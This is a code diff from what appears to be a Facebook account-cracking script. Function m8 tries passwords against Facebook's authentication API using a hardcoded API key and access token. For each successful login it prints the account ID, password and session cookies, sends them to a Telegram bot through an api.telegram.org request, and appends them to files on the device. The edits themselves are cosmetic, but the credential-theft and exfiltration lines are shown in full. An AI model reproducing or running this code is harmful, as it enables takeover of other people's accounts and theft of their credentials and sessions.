@@ -1081,7 +1081,7 @@ def m8(ids,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            update={'User-Agent':uax,
+            update={'User-Agent':ua,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
@@ -1109,7 +1109,7 @@ def m8(ids,pwv):
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        statusok = (f"{cid} | {pas} | {coki}")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                         oks.append(cid)
